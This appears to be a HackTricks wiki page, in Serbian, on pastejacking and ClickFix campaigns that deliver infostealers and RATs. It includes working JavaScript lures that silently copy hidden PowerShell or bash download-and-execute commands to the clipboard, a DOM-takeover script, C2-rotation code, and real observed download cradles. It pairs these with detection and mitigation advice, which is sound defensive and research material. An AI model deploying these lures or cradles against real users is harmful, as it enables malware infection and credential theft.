# Clipboard Hijacking (Pastejacking) Napadi

{{#include ../../banners/hacktricks-training.md}}

> "Nikada ne lepite ništa što niste sami kopirali." – staro, ali i dalje važeće savetovanje

## Pregled

Clipboard hijacking – takođe poznato kao *pastejacking* – zloupotrebljava činjenicu da korisnici rutinski copy-and-paste komande bez njihove provere. Maliciozna web stranica (ili bilo koji kontekst sposoban za JavaScript, kao što su Electron ili Desktop aplikacija) programski smešta tekst pod kontrolom napadača u sistemski clipboard. Žrtve se obično, kroz pažljivo osmišljene instrukcije socijalnog inženjeringa, podstiču da pritisnu **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ili otvore terminal i *paste* sadržaj clipboard-a, čime se odmah izvršavaju proizvoljne komande.

Pošto **ništa nije preuzeto kao fajl i nijedan attachment nije otvoren**, tehnika zaobilazi većinu e-mail i web-content sigurnosnih kontrola koje prate attachment-e, macros ili direktno izvršavanje komandi. Napad je zbog toga popularan u phishing kampanjama koje isporučuju commodity malware familije poput NetSupport RAT, Latrodectus loader ili Lumma Stealer.

## Forced copy buttons and hidden payloads (macOS one-liners)

Neki macOS infostealeri kloniraju installer sajtove (npr. Homebrew) i **forsiraju upotrebu “Copy” dugmeta** tako da korisnici ne mogu selektovati samo vidljivi tekst. Unos u clipboard sadrži očekivanu instalacionu komandu plus dodatni Base64 payload (npr. `...; echo <b64> | base64 -d | sh`), tako da jedan paste izvršava oba koraka dok UI krije dodatnu fazu.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starije kampanje su koristile `document.execCommand('copy')`, novije se oslanjaju na asinhroni **Clipboard API** (`navigator.clipboard.writeText`).

## Tok ClickFix / ClearFake

1. Korisnik posećuje typosquatted ili kompromitovan sajt (npr. `docusign.sa[.]com`)
2. Injectovani **ClearFake** JavaScript poziva helper `unsecuredCopyToClipboard()` koji tiho čuva Base64-encoded PowerShell one-liner u clipboard-u.
3. HTML instrukcije kažu žrtvi: *“Pritisnite **Win + R**, zalepite komandu i pritisnite Enter da biste rešili problem.”*
4. `powershell.exe` se izvršava, preuzimajući arhivu koja sadrži legitimni izvršni fajl plus zlonamerni DLL (klasično DLL sideloading).
5. Loader dekriptuje dodatne faze, ubacuje shellcode i instalira persistence (npr. scheduled task) – na kraju pokrećući NetSupport RAT / Latrodectus / Lumma Stealer.

### Primer NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) traži u svom direktorijumu `msvcp140.dll`.
* Maliciozni DLL dinamički rešava API-je pomoću **GetProcAddress**, preuzima dva binarna fajla (`data_3.bin`, `data_4.bin`) koristeći **curl.exe**, dešifruje ih koristeći rolling XOR key `"https://google.com/"`, injektuje finalni shellcode i raspakuje **client32.exe** (NetSupport RAT) u `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Preuzima `la.txt` pomoću **curl.exe**
2. Pokreće JScript downloader unutar **cscript.exe**
3. Preuzima MSI payload → ispušta `libcef.dll` pored potpisane aplikacije → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer putem MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** poziv pokreće skriveni PowerShell skript koji preuzima `PartyContinued.exe`, ekstrahuje `Boat.pst` (CAB), rekonstruiše `AutoIt3.exe` pomoću `extrac32` i spajanjem fajlova i na kraju pokreće `.a3x` skript koji eksfiltruje kredencijale iz browsera na `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Neke ClickFix kampanje potpuno preskaču preuzimanja fajlova i upute žrtve da nalepi one‑liner koji preuzima i izvršava JavaScript preko WSH, postavlja persistenciju i svakodnevno rotira C2. Primer uočenog lanca:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ključne osobine
- Obfuskovan URL koji se pri izvršavanju obrće kako bi se izbegla površna inspekcija.
- JavaScript perzistira preko Startup LNK (WScript/CScript) i bira C2 na osnovu trenutnog dana — omogućavajući brzu rotaciju domena.

Minimalni JS fragment koji se koristi za rotaciju C2s po datumu:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Sledeća faza obično raspoređuje loader koji uspostavlja persistence i povlači RAT (npr. PureHVNC), često pinujući TLS na hardkodovani sertifikat i chunk-ujući saobraćaj.

Detection ideas specific to this variant
- Stablo procesa: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Pokretački artefakti: LNK u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` koji poziva WScript/CScript sa JS putem pod `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU i command‑line telemetrija koja sadrži `.split('').reverse().join('')` ili `eval(a.responseText)`.
- Ponavljani `powershell -NoProfile -NonInteractive -Command -` sa velikim stdin payload-ovima za unošenje dugih skripti bez dugačkih komandnih linija.
- Scheduled Tasks koji potom izvršavaju LOLBins kao što je `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` pod task-om/putanjom koja izgleda kao updater (npr. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Dnevno-rotirajući C2 hostnames i URL-ovi sa obrascem `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korelacija clipboard write događaja praćenih Win+R paste pa neposrednim izvršenjem `powershell.exe`.

Blue-teams mogu kombinovati clipboard, process-creation i registry telemetriju da precizno identifikuju zloupotrebu pastejackinga:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` čuva istoriju **Win + R** komandi – tražite neuobičajene Base64 / obfuskovane unose.
* Security Event ID **4688** (Process Creation) gde `ParentImage` == `explorer.exe` i `NewProcessName` u { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** za kreiranja fajlova pod `%LocalAppData%\Microsoft\Windows\WinX\` ili privremenim folderima neposredno pre sumnjivog 4688 događaja.
* EDR clipboard senzori (ako postoje) – korrelirajte `Clipboard Write` odmah praćenim novim PowerShell procesom.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Recent campaigns masovno proizvode lažne CDN/browser verification stranice ("Just a moment…", IUAM-style) koje primoravaju korisnike da kopiraju OS-specifične komande iz svog clipboard-a u native konzole. Ovo izvodi izvršenje izvan browser sandbox-a i radi na Windows i macOS.

Key traits of the builder-generated pages
- Detekcija OS-a preko `navigator.userAgent` da se prilagode payload-i (Windows PowerShell/CMD vs. macOS Terminal). Opcionalni decoyi/no-opovi za nepodržane OS da se održi iluzija.
- Automatsko clipboard-copy pri benignim UI akcijama (checkbox/Copy) dok vidljivi tekst može da se razlikuje od sadržaja clipboard-a.
- Blokiranje mobilnih uređaja i popover sa korak‑po‑korak instrukcijama: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opcionalna obfuskacija i single-file injector koji prepiše kompromitovani sajtov DOM sa Tailwind-styled verification UI (nije potrebna nova registracija domena).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence inicijalnog pokretanja
- Koristite `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` tako da izvršavanje nastavi nakon zatvaranja terminala, smanjujući vidljive artefakte.

In-place page takeover na kompromitovanim sajtovima
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ideje za detekciju i lov (hunting) specifične za IUAM-style mamce
- Web: Stranice koje povezuju Clipboard API sa verifikacionim widget-ima; neslaganje između prikazanog teksta i clipboard payload-a; grananje bazirano na `navigator.userAgent`; Tailwind + single-page replace u sumnjivim kontekstima.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` ubrzo nakon interakcije sa browser-om; batch/MSI instalateri pokrenuti iz `%TEMP%`.
- macOS endpoint: Terminal/iTerm koji pokreće `bash`/`curl`/`base64 -d` sa `nohup` blizu browser događaja; pozadinski zadaci koji prežive zatvaranje terminala.
- Korelacija `RunMRU` Win+R istorije i clipboard zapisa sa naknadnim kreiranjem konzolnih procesa.

Pogledajte takođe sledeće podržavajuće tehnike

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 evolucije lažnih CAPTCHA / ClickFix (ClearFake, Scarlet Goldfinch)

- ClearFake nastavlja da kompromituje WordPress sajtove i injektuje loader JavaScript koji povezuje eksternе hostove (Cloudflare Workers, GitHub/jsDelivr) i čak blockchain “etherhiding” pozive (npr., POST-ove ka Binance Smart Chain API endpoint-ima kao `bsc-testnet.drpc[.]org`) kako bi povukao aktuelnu logiku mamca. Nedavni overlay-i intenzivno koriste lažne CAPTCHA-e koje korisnike upute da copy/paste-uju one-liner (T1204.004) umesto da bilo šta preuzimaju.
- Početna egzekucija se sve više delegira potpisanim script host-ovima/LOLBAS. Lanac iz januara 2026. zamenio je raniju upotrebu `mshta` sa ugrađenim `SyncAppvPublishingServer.vbs` koji se izvršava preko `WScript.exe`, prosleđujući PowerShell-slične argumente sa alias-ima/wildcard-ima da bi dohvatili udaljeni sadržaj:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` je potpisan i obično ga koristi App-V; u paru sa `WScript.exe` i neobičnim argumentima (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) postaje visokosignalna LOLBAS etapa za ClearFake.
- februar 2026 lažni CAPTCHA payloads vratili su se na čiste PowerShell download cradles. Dva živa primera:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Prvi lanac je in-memory `iex(irm ...)` grabber; drugi stage-uje preko `WinHttp.WinHttpRequest.5.1`, upisuje privremeni `.ps1`, zatim pokreće sa `-ep bypass` u skrivenom prozoru.

Saveti za detekciju/hunting ovih varijanti
- Poreklo procesa: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ili PowerShell cradles odmah nakon clipboard writes/Win+R.
- Ključne reči u komandnoj liniji: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, ili raw IP `iex(irm ...)` paterni.
- Mreža: outbound ka CDN worker hostovima ili blockchain RPC endpoints sa script hosts/PowerShell-a ubrzo nakon web pregledanja.
- Fajl/registri: kreiranje privremenog `.ps1` pod `%TEMP%` plus RunMRU unosi koji sadrže ove one-linere; blokirajte/uzbunjivanje na signed-script LOLBAS (WScript/cscript/mshta) koji se izvršavaju sa eksternim URL-ovima ili obfuskovanim alias stringovima.

## Mitigations

1. Browser hardening – onemogućite clipboard write-access (`dom.events.asyncClipboard.clipboardItem` itd.) ili zahtevajte korisnički gest.
2. Security awareness – naučite korisnike da *ukucaju* osetljive komande ili ih prvo zalepe u text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control za blokiranje proizvoljnih one-linera.
4. Network controls – blokirajte outbound zahteve ka poznatim pastejacking i malware C2 domenima.

## Related Tricks

* **Discord Invite Hijacking** često zloupotrebljava isti ClickFix pristup nakon što navede korisnike u maliciozni server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
